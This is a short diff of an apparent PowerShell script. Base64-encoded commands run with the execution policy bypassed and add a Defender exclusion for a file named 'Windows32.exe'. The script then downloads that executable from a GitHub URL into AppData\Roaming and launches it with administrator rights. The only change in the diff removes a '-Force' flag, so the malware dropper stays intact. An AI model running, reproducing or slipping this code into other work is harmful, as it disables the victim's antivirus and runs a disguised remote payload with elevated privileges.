@@ -2,4 +2,4 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAH
 powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAUwB1AGIAZABpAHIAXABXAGkAbgBkAG8AdwBzADMAMgAuAGUAeABlACIAIAAtAEYAbwByAGMAZQA=
 powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQAiACAALQBGAG8AcgBjAGUA
 Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windows32.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Windows32.exe"
-Start-Process "$env:USERPROFILE\Appdata\Roaming\Windows32.exe" -Force -Verb RunAs
+Start-Process "$env:USERPROFILE\Appdata\Roaming\Windows32.exe" -Verb RunAs
